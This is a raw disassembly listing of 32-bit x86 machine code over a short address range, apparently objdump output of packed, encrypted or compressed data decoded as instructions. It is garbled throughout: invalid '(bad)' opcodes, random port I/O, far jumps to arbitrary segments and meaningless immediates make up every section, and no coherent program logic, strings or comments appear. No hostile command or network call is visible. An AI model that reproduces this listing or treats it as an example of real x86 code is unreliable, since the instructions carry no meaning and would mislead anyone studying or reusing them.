  42ce29:	sbb    ah,BYTE PTR [esp+edi*2+0x6]
  42ce2d:	out    0xda,al
  42ce2f:	icebp  
  42ce30:	out    0x5d,eax
  42ce32:	(bad)  
  42ce33:	fadd   QWORD PTR [edi+0x1c]
  42ce36:	test   ebp,ebx
  42ce38:	in     eax,dx
  42ce39:	pop    ecx
  42ce3a:	add    al,0xeb
  42ce3c:	iret   
  42ce3d:	pushf  
  42ce3e:	pushf  
  42ce3f:	xchg   esi,eax
  42ce40:	mov    ss,WORD PTR [esi]
  42ce42:	ficomp WORD PTR [edi-0x3c]
  42ce45:	into   
  42ce46:	cld    
  42ce47:	pop    ebp
  42ce48:	and    al,0x13
  42ce4a:	or     al,0x99
  42ce4c:	fcmove st,st(1)
  42ce4e:	jmp    0x9c6a:0x57d56772
  42ce55:	jecxz  0x42ce81
  42ce57:	add    DWORD PTR [eax],0x9
  42ce5a:	daa    
  42ce5b:	cmp    BYTE PTR [eax],cl
  42ce5d:	adc    DWORD PTR [ebp+0x79],edx
  42ce60:	sub    dh,BYTE PTR [ecx-0x3df62840]
  42ce66:	dec    ebp
  42ce67:	dec    edi
  42ce68:	sbb    BYTE PTR [edi+0x2a21b599],bh
  42ce6e:	cmp    bl,BYTE PTR [ecx]
  42ce70:	sbb    cl,0xfc
  42ce73:	mov    ds:0x5993c359,al
  42ce78:	mov    dh,0xeb
  42ce7a:	retf   0xa0c
  42ce7d:	lods   eax,DWORD PTR ds:[esi]
  42ce7e:	pop    ds
  42ce7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce80:	jg     0x42ce5d
  42ce82:	mov    DWORD PTR [ecx],ecx
  42ce84:	nop    DWORD PTR [ebp-0x1a70af4f]
  42ce8b:	(bad)  
  42ce8c:	sub    ch,BYTE PTR [ebx]
  42ce8e:	xchg   ecx,eax
  42ce8f:	pop    edx
  42ce90:	mov    ah,0x6b
  42ce92:	jmp    0x42ce73
  42ce94:	xchg   DWORD PTR [edx-0x6264fc3c],esi
  42ce9a:	mov    ah,0xc9
  42ce9c:	or     DWORD PTR [ebx+edi*1-0x70],edi
  42cea0:	bound  esp,QWORD PTR [edi-0x8]
  42cea3:	imul   eax,DWORD PTR ds:0xad84873f,0xffffff8f
  42ceaa:	aam    0x2d
  42ceac:	adc    esp,DWORD PTR [ebx-0x4b410d24]
  42ceb2:	add    al,BYTE PTR [edi+0x7f]
	...
  42cf14:	add    BYTE PTR [eax],al
  42cf16:	jae    0x42cf55
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx+0x6c0b2d11]
  42cf24:	and    al,dl
  42cf26:	cmp    ah,cl
  42cf28:	add    DWORD PTR [eax],eax
  42cf2a:	pop    es
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    BYTE PTR [ecx+0x54],cl
  42cf30:	cld    
  42cf31:	into   
  42cf32:	aas    
  42cf33:	retf   
  42cf34:	push   0x9b65bf1
  42cf39:	outs   dx,DWORD PTR ds:[esi]
  42cf3a:	test   DWORD PTR [esp+esi*2+0x4b9fbffb],edi
  42cf41:	mov    ebx,0x4dc0a018
  42cf46:	push   edx
  42cf47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf48:	dec    ebx
  42cf49:	fist   WORD PTR [ebx+0x4aa6150d]
  42cf4f:	imul   ecx,DWORD PTR [ecx+0x237e3db4],0xffffffb9
  42cf56:	fldenv [esi-0x1b406ad7]
  42cf5c:	sub    dh,BYTE PTR [eax+0x11556d9b]
  42cf62:	cmp    dl,bh
  42cf64:	nop
  42cf65:	sbb    BYTE PTR [ebx],0x72
  42cf68:	cli    
  42cf69:	dec    ecx
  42cf6a:	cs push ebx
  42cf6c:	mov    edx,DWORD PTR [esi]
  42cf6e:	icebp  
  42cf6f:	(bad)  [esi+0x70]
  42cf72:	int3   
  42cf73:	ret    
  42cf74:	mul    DWORD PTR [eax]
  42cf76:	hlt    
  42cf77:	sbb    al,0x26
  42cf79:	cli    
  42cf7a:	jns    0x42cf4a
  42cf7c:	int    0xad
  42cf7e:	jge    0x42cf32
  42cf80:	adc    BYTE PTR [ecx+ebp*2+0x121da0ac],0xa
  42cf88:	out    dx,al
  42cf89:	cmp    al,0x82
  42cf8b:	xor    BYTE PTR [ebp-0x6],0xf5
  42cf8f:	retf   0xeebe
  42cf92:	jle    0x42cf7c
  42cf94:	mov    bh,0x0
  42cf96:	ins    DWORD PTR es:[edi],dx
  42cf97:	xor    al,0x20
  42cf99:	aam    0x47
  42cf9b:	adc    al,dh
  42cf9d:	sub    ecx,DWORD PTR [esi+0x419a1cc9]
  42cfa3:	dec    eax
  42cfa4:	pause  
  42cfa6:	div    DWORD PTR [esi+0x4a792a75]
  42cfac:	sbb    DWORD PTR [eax+0x48bff9a7],ecx
  42cfb2:	mov    dh,0x4e
  42cfb4:	rol    DWORD PTR [ebx+ecx*8-0x40],cl
  42cfb8:	jno    0x42cfa1
  42cfba:	sbb    BYTE PTR es:[esi+0x415a7500],al
  42cfc1:	ret    0x7ad9
  42cfc4:	xchg   ecx,eax
  42cfc5:	sbb    ah,dh
  42cfc7:	lahf   
  42cfc8:	sbb    al,0x25
  42cfca:	aas    
  42cfcb:	jns    0x42d00e
  42cfcd:	fidivr DWORD PTR [ebx-0x5d]
  42cfd0:	mov    ds:0x72820ee9,eax
  42cfd5:	ja     0x42cfb1
  42cfd7:	js     0x42cfb6
  42cfd9:	(bad)  
  42cfda:	ficom  DWORD PTR [edx-0x42]
  42cfdd:	addr16 sub eax,0x446dc1d9
  42cfe3:	dec    BYTE PTR [ecx]
  42cfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cfe6:	aam    0xaf
  42cfe8:	push   ebp
  42cfe9:	daa    
  42cfea:	add    BYTE PTR [esi+0x1],ah
  42cfed:	ins    BYTE PTR es:[edi],dx
  42cfee:	aaa    
  42cfef:	mov    ds:0xcc118003,al
  42cff4:	add    BYTE PTR [ebx-0x2b6a8ba7],0xf3
  42cffb:	mov    eax,ds:0xd8296bf3
  42d000:	stc    
  42d001:	add    cl,BYTE PTR gs:[esi+0x38]
  42d005:	sub    edx,DWORD PTR [ebx+0x6f]
  42d008:	loop   0x42cfbe
  42d00a:	and    bl,dh
  42d00c:	nop
  42d00d:	in     al,dx
  42d00e:	push   edi
  42d00f:	arpl   WORD PTR [ebx],sp
  42d011:	xor    BYTE PTR [eax],0x77
  42d014:	inc    esi
  42d015:	imul   ebx,DWORD PTR [ecx-0x3427a119],0x9dd418ff
  42d01f:	sbb    eax,0x683f66e7
  42d024:	cmp    BYTE PTR [esi+0x1b581319],0xdf
  42d02b:	pop    eax
  42d02c:	mov    dh,0x72
  42d02e:	dec    ecx
  42d02f:	xor    al,0x33
  42d031:	add    BYTE PTR [ebx+0x5b57],bh
	...
  42d093:	add    BYTE PTR [eax],al
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	jb     0x42d02c
  42d0a4:	mov    eax,0x1e2418e
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [esi-0x46],dh
  42d0b0:	push   0x17
  42d0b2:	imul   ebp,esp,0x879ea790
  42d0b8:	(bad)  
  42d0ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0bb:	xor    eax,0x1f411c72
  42d0c0:	push   ecx
  42d0c1:	mov    DWORD PTR [ebx-0x6],esi
  42d0c4:	push   cs
  42d0c5:	movups XMMWORD PTR [ecx-0x2cfe3310],xmm6
  42d0cc:	setge  BYTE PTR [esi]
  42d0cf:	mov    ds:0x91ce9735,al
  42d0d4:	pop    edx
  42d0d5:	xchg   ecx,eax
  42d0d6:	pop    eax
  42d0d7:	mov    ds:0x2b41afe0,al
  42d0dc:	loop   0x42d12f
  42d0de:	out    0x53,eax
  42d0e0:	mov    ebx,eax
  42d0e2:	pop    ds
  42d0e3:	mov    al,0x72
  42d0e5:	in     al,dx
  42d0e6:	addr16 int 0xae
  42d0e9:	xchg   BYTE PTR [eax-0x1f],bl
  42d0ec:	dec    ebx
  42d0ed:	cld    
  42d0ee:	dec    edi
  42d0ef:	out    dx,eax
  42d0f0:	or     eax,DWORD PTR [ebx+0x23]
  42d0f3:	mov    edi,0x4bc2e9a3
  42d0f8:	push   es
  42d0f9:	jne    0x42d0c9
  42d0fb:	add    ebp,esi
  42d0fd:	mov    ebx,0x377c7c33
  42d102:	mov    DWORD PTR [ecx+0xf],edi
  42d105:	push   cs
  42d106:	push   ss
  42d107:	jg     0x42d0b0
  42d109:	es sbb al,0xd1
  42d10c:	in     eax,dx
  42d10d:	shl    DWORD PTR [edi-0x6a7bbb7b],1
  42d113:	fmul   QWORD PTR [edx+ebx*2-0x4f]
  42d117:	repz scas eax,DWORD PTR es:[edi]
  42d119:	je     0x42d0c7
  42d11b:	into   
  42d11c:	(bad)  
  42d11d:	mov    ah,0x79
  42d11f:	(bad)  
  42d120:	push   0x6c
  42d122:	dec    esi
  42d123:	jecxz  0x42d133
  42d125:	sbb    dh,bl
  42d127:	dec    ecx
  42d128:	jae    0x42d156
  42d12a:	and    al,0xfc
  42d12c:	shr    BYTE PTR [esi-0x35],0xa1
  42d130:	inc    ebp
  42d131:	clc    
  42d132:	mov    DWORD PTR [ebx],esp
  42d134:	jo     0x42d0d1
  42d136:	aas    
  42d137:	xchg   edi,eax
  42d138:	xchg   BYTE PTR [ecx+0x70],bh
  42d13b:	and    BYTE PTR [edi+0x90b035f],ch
  42d141:	cmp    DWORD PTR [eax],0xffffffb3
  42d144:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d146:	inc    esi
  42d147:	cmp    DWORD PTR [edx],eax
  42d149:	(bad)  
  42d14b:	leave  
  42d14c:	bound  esp,QWORD PTR [ebx+0x14d4f83b]
  42d152:	inc    edi
  42d153:	inc    esi
  42d154:	push   0xffffffaa
  42d156:	shr    dh,0xe6
  42d159:	cmc    
  42d15a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d15b:	out    0x17,eax
  42d15d:	in     al,0x6f
  42d15f:	adc    cl,BYTE PTR [ebx]
  42d161:	push   edx
  42d162:	loope  0x42d0fb
  42d164:	cmp    al,0x56
  42d166:	ret    
  42d167:	mov    ebx,?
  42d169:	bound  esi,QWORD PTR [edi-0x411099ec]
  42d16f:	cmp    BYTE PTR [eax+0xdd35ac1],bh
  42d175:	test   eax,0x6af5c4d0
  42d17a:	and    ebp,eax
  42d17c:	repnz and ecx,DWORD PTR [ecx+0xd12616e]
  42d183:	push   es
  42d184:	lock cs data16 int 0x4a
  42d189:	and    ecx,DWORD PTR ds:[ebx-0x4d]
  42d18d:	scas   al,BYTE PTR es:[edi]
  42d18e:	je     0x42d11c
  42d190:	popa   
  42d191:	xor    eax,0xfbfcb177
  42d196:	xor    al,0xa3
  42d198:	sbb    ebx,DWORD PTR [ebp+0xa269f6c]
  42d19e:	dec    esi
  42d19f:	daa    
  42d1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1a1:	(bad)  
  42d1a2:	(bad)  
  42d1a3:	mov    esi,0xb7847228
  42d1a8:	arpl   cx,dx
  42d1aa:	adc    dl,al
  42d1ac:	mov    edx,0xf0434877
  42d1b1:	clc    
  42d1b2:	(bad)  
  42d1b3:	inc    esp
  42d1b4:	add    BYTE PTR [eax],0x0
	...
  42d213:	add    BYTE PTR [eax],al
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	imul   esi,eax,0xffffffa8
  42d225:	sahf   
  42d226:	dec    eax
  42d227:	jecxz  0x42d22a
  42d229:	add    BYTE PTR [edi],al
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [esi],ch
  42d22f:	adc    edi,DWORD PTR [esi+0x162a3354]
  42d235:	ud0    ebx,ebx
  42d238:	xchg   edx,edi
  42d23a:	sub    DWORD PTR [eax],ebx
  42d23c:	outs   dx,BYTE PTR ds:[esi]
  42d23d:	sbb    eax,0xa8851b6b
  42d242:	stos   BYTE PTR es:[edi],al
  42d243:	ins    BYTE PTR es:[edi],dx
  42d244:	lods   eax,DWORD PTR ds:[esi]
  42d245:	jnp    0x42d214
  42d247:	sbb    edx,DWORD PTR [ebx]
  42d249:	fadd   DWORD PTR ds:0x96123b28
  42d24f:	pop    ds
  42d250:	fistp  QWORD PTR [edx+0x1b]
  42d253:	lods   al,BYTE PTR ds:[esi]
  42d254:	xlat   BYTE PTR ds:[ebx]
  42d255:	loope  0x42d247
  42d257:	int    0x30
  42d259:	scas   eax,DWORD PTR es:[edi]
  42d25a:	addr16 mov ds:0x9cdf,eax
  42d25e:	(bad)  
  42d260:	call   0xd130:0xf29249f7
  42d267:	jne    0x42d2c9
  42d269:	popf   
  42d26a:	cmp    al,BYTE PTR ds:[ebp+0x7d2e8108]
  42d271:	stos   DWORD PTR es:[edi],eax
  42d272:	sbb    al,0x82
  42d274:	gs mov ch,0x1d
  42d277:	scas   al,BYTE PTR es:[edi]
  42d278:	out    0xb2,eax
  42d27a:	pop    ebp
  42d27b:	in     al,dx
  42d27c:	sub    bl,BYTE PTR [eax-0x315d4dab]
  42d282:	rcl    eax,cl
  42d284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d285:	ins    BYTE PTR es:[edi],dx
  42d286:	fs int3 
  42d288:	or     BYTE PTR [ebx+0x68],bh
  42d28b:	xor    eax,0x60cbfe25
  42d291:	imul   ecx,DWORD PTR [edi+0x18],0x81a67b33
  42d298:	inc    ebp
  42d299:	push   esp
  42d29a:	(bad)  [esp+ebp*4-0x385f75af]
  42d2a1:	cli    
  42d2a2:	sbb    BYTE PTR [esi],0x24
  42d2a5:	mov    esp,0xcf254652
  42d2aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2ab:	push   ecx
  42d2ac:	cmp    BYTE PTR [esi+0x6f],dl
  42d2af:	adc    ecx,ecx
  42d2b1:	lahf   
  42d2b2:	call   0x12486c71
  42d2b7:	sbb    al,0x86
  42d2b9:	inc    edx
  42d2ba:	cli    
  42d2bb:	adc    ebx,DWORD PTR [edi+0x1f]
  42d2be:	xor    al,0x9
  42d2c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2c1:	data16 loope 0x42d290
  42d2c4:	jle    0x42d2b7
  42d2c6:	ror    BYTE PTR [ecx],cl
  42d2c8:	test   DWORD PTR ds:0xb1f076ba,ecx
  42d2ce:	inc    esi
  42d2cf:	sub    al,0x5e
  42d2d1:	push   ebp
  42d2d2:	lea    ebp,[edx-0x2fc967cb]
  42d2d8:	jle    0x42d343
  42d2da:	mov    dl,0x8c
  42d2dc:	aam    0xf4
  42d2de:	rcl    ah,1
  42d2e0:	sar    BYTE PTR [ecx-0x6e],0xcb
  42d2e4:	popf   
  42d2e5:	ficomp DWORD PTR [edi]
  42d2e7:	lea    ebp,[ebp+0x2e]
  42d2ea:	adc    al,0x8f
  42d2ec:	push   0xffffffbe
  42d2ee:	fscale 
  42d2f0:	sar    DWORD PTR [ecx],0xf5
  42d2f3:	cdq    
  42d2f4:	mov    cl,0x6d
  42d2f6:	mov    eax,ds:0x84e0075f
  42d2fb:	adc    dh,BYTE PTR [eax+0x6e0135ad]
  42d301:	mov    BYTE PTR [ebx],dh
  42d303:	pop    ecx
  42d304:	jo     0x42d340
  42d306:	test   bl,dl
  42d308:	into   
  42d309:	xlat   BYTE PTR ds:[ebx]
  42d30a:	cmc    
  42d30b:	popa   
  42d30c:	loop   0x42d32a
  42d30e:	or     DWORD PTR ds:0xf920db55,esi
  42d314:	cld    
  42d315:	into   
  42d316:	pusha  
  42d317:	push   ebp
  42d318:	jge    0x42d2db
  42d31a:	in     eax,dx
  42d31b:	sbb    BYTE PTR [ecx-0x31],ch
  42d31e:	xchg   ebp,eax
  42d31f:	and    al,0xba
  42d321:	popa   
  42d322:	xor    dh,ch
  42d324:	daa    
  42d325:	in     al,dx
  42d326:	dec    ebp
  42d327:	dec    esi
  42d328:	(bad)  
  42d329:	cmp    edi,esp
  42d32b:	cmp    al,0xdf
  42d32d:	dec    esp
  42d32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d32f:	inc    eax
  42d330:	retf   0x8f54
  42d333:	and    esp,edi
	...
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8-0x570c4ca8],bl
  42d3a5:	and    eax,0x1e44f
  42d3aa:	pop    es
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    BYTE PTR [ebp-0x23],bl
  42d3b0:	mov    eax,0x7a5742b8
  42d3b5:	jae    0x42d34f
  42d3b7:	xor    al,0xb9
  42d3b9:	fs fdivrp st(1),st
  42d3bc:	pop    ecx
  42d3bd:	mov    edx,0xbafa3964
  42d3c2:	outs   dx,BYTE PTR ds:[esi]
  42d3c3:	stos   DWORD PTR es:[edi],eax
  42d3c4:	push   esi
  42d3c5:	jae    0x42d35d
  42d3c7:	xor    edi,DWORD PTR [edi-0x451fa0cb]
  42d3cd:	push   0x48
  42d3cf:	pop    es
  42d3d0:	dec    ebx
  42d3d1:	mov    esi,0x449fa623
  42d3d6:	rcl    ebx,cl
  42d3d8:	cmp    DWORD PTR [ebp-0x3b],0xd4dcab8e
  42d3df:	mov    bx,0xe61c
  42d3e3:	xchg   ebx,eax
  42d3e4:	cmp    BYTE PTR [edi+edi*4],al
  42d3e7:	and    dl,al
  42d3e9:	cmp    BYTE PTR [edi+0x15],dl
  42d3ec:	popa   
  42d3ed:	fdiv   st,st(0)
  42d3ef:	fst    QWORD PTR [edi]
  42d3f1:	sub    DWORD PTR [ecx],ebx
  42d3f3:	in     eax,0x82
  42d3f5:	mov    ebp,0xee635607
  42d3fa:	and    BYTE PTR [edx-0x67],dl
  42d3fd:	ds mov ecx,0xc3a818a3
  42d403:	imul   ecx,DWORD PTR [eax],0xffffff91
  42d406:	iret   
  42d407:	cmp    DWORD PTR [ebx+0x2b6fc473],eax
  42d40d:	sbb    ebx,esi
  42d40f:	test   DWORD PTR [ebp+0x2b6309f0],ecx
  42d415:	aam    0xd8
  42d417:	xor    BYTE PTR [ecx],dh
  42d419:	aam    0x82
  42d41b:	xchg   esp,eax
  42d41c:	repnz sbb bh,BYTE PTR [edx-0x12f6b499]
  42d423:	int3   
  42d424:	dec    eax
  42d425:	(bad)  
  42d426:	xlat   BYTE PTR ds:[ebx]
  42d427:	and    esi,DWORD PTR [esi+0x33aec6a3]
  42d42d:	push   esi
  42d42e:	cli    
  42d42f:	cmp    DWORD PTR [edx-0x3bf214b],0x6a
  42d436:	push   esi
  42d437:	loope  0x42d406
  42d439:	dec    eax
  42d43a:	and    al,0x1a
  42d43c:	call   0xe6e0:0xf22852e9
  42d443:	xchg   esp,eax
  42d444:	xchg   esi,eax
  42d445:	xchg   BYTE PTR [ecx-0x605b66aa],ch
  42d44b:	stc    
  42d44c:	push   edi
  42d44d:	ds gs mov cs,esp
  42d451:	mov    ah,BYTE PTR [edi+0x7a]
  42d454:	push   es
  42d455:	add    dl,BYTE PTR [eax-0x70f46239]
  42d45b:	div    BYTE PTR ds:0xf9be63fb
  42d461:	xchg   esi,eax
  42d462:	sti    
  42d463:	call   esi
  42d465:	or     DWORD PTR [eax+0x23],edi
  42d468:	imul   esp,DWORD PTR [ebp+0x57650a0],0xffffff98
  42d46f:	ins    BYTE PTR es:[edi],dx
  42d470:	push   ebp
  42d471:	sti    
  42d472:	in     al,dx
  42d473:	adc    al,BYTE PTR [ebx-0x71]
  42d476:	jbe    0x42d4d7
  42d478:	repnz sbb eax,0xd8c67d31
  42d47e:	lock add ebx,DWORD PTR [ecx+0x4b]
  42d482:	or     bl,BYTE PTR [edx-0x4e579c52]
  42d488:	lock mov dl,0x68
  42d48b:	sub    eax,0x607d1123
  42d490:	pop    es
  42d491:	cdq    
  42d492:	inc    ebp
  42d493:	not    BYTE PTR [eax]
  42d495:	or     BYTE PTR [edi+0x11a6aae5],0x14
  42d49c:	cmp    eax,0x9a3e17bd
  42d4a1:	jns    0x42d4b9
  42d4a3:	cmp    eax,0x977db28a
  42d4a8:	sub    DWORD PTR [ebp+0x4d2ea484],0xffffffde
  42d4af:	and    cl,BYTE PTR [ebx]
  42d4b1:	dec    ecx
  42d4b2:	loop   0x42d4f9
  42d4b4:	ret    
	...
  42d515:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d51b:	ja     0x42d4f6
  42d51d:	inc    DWORD PTR [eax]
  42d51f:	add    edx,DWORD PTR [eax+0x69cf9ef3]
  42d525:	jge    0x42d57d
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    bl,bh
  42d52f:	xor    DWORD PTR [ecx+0x75],ecx
  42d532:	data16 jnp 0x42d56e
  42d535:	iret   
  42d536:	lock sub dh,BYTE PTR [ecx]
  42d539:	push   esp
  42d53a:	xor    ah,dl
  42d53c:	rcr    BYTE PTR [edi+0x50],1
  42d53f:	sub    cl,BYTE PTR [esi+0x63]
  42d542:	mov    eax,0x3a225224
  42d547:	test   DWORD PTR [eax+0x68],ecx
  42d54a:	xor    DWORD PTR [edx],ebp
  42d54c:	pop    ebp
  42d54d:	fwait
  42d54e:	pop    es
  42d54f:	push   edx
  42d550:	mov    dl,0x22
  42d552:	xor    DWORD PTR [eax-0x63],0x615dcc97
  42d559:	inc    esi
  42d55a:	ins    DWORD PTR es:[edi],dx
  42d55b:	lods   al,BYTE PTR ds:[esi]
  42d55c:	daa    
  42d55d:	sub    BYTE PTR [ecx-0xf],al
  42d560:	push   edi
  42d561:	mov    ebx,0x9dc26d27
  42d566:	sub    al,0xd2
  42d568:	rcl    BYTE PTR [esi+esi*2-0x7c],0xbf
  42d56d:	jl     0x42d5b0
  42d56f:	inc    esi
  42d570:	and    BYTE PTR [eax+0x485df013],dl
  42d576:	sbb    BYTE PTR [edi+0x47],ch
  42d579:	dec    esi
  42d57a:	push   edi
  42d57b:	dec    ecx
  42d57c:	fldenv [ebx]
  42d57e:	jae    0x42d571
  42d580:	leave  
  42d581:	stc    
  42d582:	adc    al,0x2c
  42d584:	rcr    DWORD PTR [esi-0x58],cl
  42d587:	jne    0x42d56d
  42d589:	loope  0x42d543
  42d58b:	pop    ss
  42d58c:	sub    eax,0x5b073fa2
  42d591:	inc    esp
  42d592:	sysenter 
  42d594:	mov    esi,0x6029c4c3
  42d599:	adc    ebp,DWORD PTR [edx]
  42d59b:	push   esp
  42d59c:	push   ebx
  42d59d:	xor    ebp,DWORD PTR ds:0x4c17b524
  42d5a3:	fxch   st(7)
  42d5a5:	mov    eax,ebp
  42d5a7:	cmp    al,0xe2
  42d5a9:	dec    esi
  42d5aa:	int    0xf1
  42d5ac:	lea    esi,[eax+esi*4-0x35]
  42d5b0:	or     al,0xbe
  42d5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5b3:	lock adc dh,BYTE PTR [edx-0x2c650720]
  42d5ba:	arpl   WORD PTR [edi],sp
  42d5bc:	shr    DWORD PTR [ebx+0x3a],1
  42d5bf:	cmp    ch,BYTE PTR [esi+ebp*8]
  42d5c2:	jle    0x42d54c
  42d5c4:	popa   
  42d5c5:	pushf  
  42d5c6:	lock pop edi
  42d5c8:	xchg   DWORD PTR ds:0x29d995d0,edi
  42d5ce:	mov    dl,BYTE PTR [esi-0x308810d8]
  42d5d4:	push   es
  42d5d5:	fimul  DWORD PTR [edi]
  42d5d7:	jecxz  0x42d63d
  42d5d9:	ja     0x42d656
  42d5db:	cmc    
  42d5dc:	inc    ecx
  42d5dd:	test   ecx,ecx
  42d5df:	ins    DWORD PTR es:[edi],dx
  42d5e0:	cmp    ebp,DWORD PTR [ebx+ecx*1]
  42d5e3:	nop
  42d5e4:	mov    eax,0x5f5ca6fc
  42d5e9:	sahf   
  42d5ea:	ss push esi
  42d5ec:	not    BYTE PTR [ecx-0x2a]
  42d5ef:	(bad)  
  42d5f0:	adc    BYTE PTR [edx+0x24],dh
  42d5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5f4:	mov    ds:0xe5853011,eax
  42d5f9:	stos   BYTE PTR es:[edi],al
  42d5fa:	and    al,0x4f
  42d5fc:	jge    0x42d590
  42d5fe:	bound  ecx,QWORD PTR [ecx-0x2f]
  42d601:	mov    ds,WORD PTR [ecx]
  42d603:	adc    ch,BYTE PTR [esi+0x39]
  42d606:	mov    al,0xea
  42d608:	xlat   BYTE PTR ds:[ebx]
  42d609:	neg    bh
  42d60b:	aad    0x70
  42d60d:	test   BYTE PTR [ecx+0x32e9fa62],0xfa
  42d614:	sbb    bl,ah
  42d616:	xor    eax,0xda450cba
  42d61b:	jmp    0x6e75:0xa7c10a23
  42d622:	adc    DWORD PTR [eax],edi
  42d624:	jo     0x42d62e
  42d626:	in     al,0x13
  42d628:	or     BYTE PTR [edx-0x7],al
  42d62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d62c:	ds out dx,eax
  42d62e:	sub    BYTE PTR [ebp+edx*4+0x78fc6f1e],0x0
	...
  42d696:	repz add esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0x16f38d59
  42d6a4:	jb     0x42d712
  42d6a6:	pop    ebp
  42d6a7:	out    0x1,al
  42d6a9:	add    BYTE PTR [edi],al
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [ebp-0x2c],ah
  42d6b0:	sub    eax,0xd1cda9f5
  42d6b5:	pop    es
  42d6b6:	rcl    DWORD PTR [edi+0x48],0x4a
  42d6ba:	fbld   TBYTE PTR [ebp+0x6f]
  42d6bd:	jl     0x42d6e7
  42d6bf:	sbb    eax,0xf864d2bc
  42d6c4:	xchg   BYTE PTR es:0x53f48bc3,cl
  42d6cb:	mov    bl,0x62
  42d6cd:	adc    al,0x8f
  42d6cf:	jbe    0x42d6c4
  42d6d1:	and    eax,0xc22db3dd
  42d6d6:	clc    
  42d6d7:	sub    esp,DWORD PTR [ebx+0xb]
  42d6da:	(bad)  
  42d6db:	xor    esp,ebp
  42d6dd:	fs (bad) 
  42d6df:	mov    WORD PTR [eax-0x6f],gs
  42d6e2:	sbb    dl,cl
  42d6e4:	lock mov DWORD PTR [edi],edi
  42d6e7:	and    BYTE PTR [ecx-0x1419fd00],bl
  42d6ed:	mov    ebx,0x2b0901e3
  42d6f2:	and    dl,BYTE PTR [edi]
  42d6f4:	clc    
  42d6f5:	cli    
  42d6f6:	mov    edi,0x4df8b08e
  42d6fb:	aam    0x43
  42d6fd:	cmp    BYTE PTR [ecx+0x6f],dh
  42d700:	in     eax,dx
  42d701:	inc    esi
  42d702:	jg     0x42d686
  42d704:	adc    eax,0x2b9c948b
  42d709:	loope  0x42d697
  42d70b:	sbb    dh,BYTE PTR [ebp-0x7812152f]
  42d711:	cmp    al,0xc8
  42d713:	ja     0x42d6fc
  42d715:	pmuludq mm1,QWORD PTR [ecx]
  42d718:	push   edi
  42d719:	push   0x91b7548a
  42d71e:	neg    BYTE PTR [edi]
  42d720:	sti    
  42d721:	mov    al,0x62
  42d723:	mov    cl,0x3f
  42d725:	mov    esp,0x5de6997f
  42d72a:	enter  0x7ab5,0xb0
  42d72e:	popf   
  42d72f:	push   es
  42d730:	das    
  42d731:	add    al,0xbc
  42d733:	mov    edi,0x49bbceda
  42d738:	or     bl,BYTE PTR [esi+0x172ca207]
  42d73e:	pop    edx
  42d73f:	outs   dx,DWORD PTR ds:[esi]
  42d740:	pextrw edi,(bad),0xc5
  42d742:	jl     0x42d6eb
  42d744:	(bad)  
  42d745:	fcmovnb st,st(3)
  42d747:	rcr    bl,1
  42d749:	jecxz  0x42d718
  42d74b:	lea    ecx,[ecx+0x4b]
  42d74e:	pushf  
  42d74f:	ss sub dh,cl
  42d752:	shl    bl,1
  42d754:	mov    bl,0x4b
  42d756:	xchg   edi,eax
  42d757:	jp     0x42d7c7
  42d759:	clc    
  42d75a:	push   edx
  42d75b:	mov    ecx,0x61882bcd
  42d760:	pop    ebp
  42d761:	sub    BYTE PTR [ecx],ah
  42d763:	mov    eax,ds:0x9b2285b8
  42d768:	in     al,0x9f
  42d76a:	jbe    0x42d77f
  42d76c:	hlt    
  42d76d:	jg     0x42d7b6
  42d76f:	xchg   edi,eax
  42d770:	xchg   DWORD PTR [bp+di-0xcb4],ecx
  42d775:	push   eax
  42d776:	sbb    eax,0x2d8f97f9
  42d77b:	add    al,0xc5
  42d77d:	jle    0x42d7ed
  42d77f:	xlat   BYTE PTR ds:[ebx]
  42d780:	inc    edx
  42d781:	pop    esi
  42d782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d783:	xchg   DWORD PTR [esi],ebp
  42d785:	loop   0x42d7ae
  42d787:	mov    dh,0x60
  42d789:	push   ebx
  42d78a:	xchg   ecx,eax
  42d78b:	mov    WORD PTR [esi-0x1e],?
  42d78e:	clc    
  42d78f:	retf   0x2b88
  42d792:	and    DWORD PTR [ebx+0x6ca27647],esp
  42d798:	sahf   
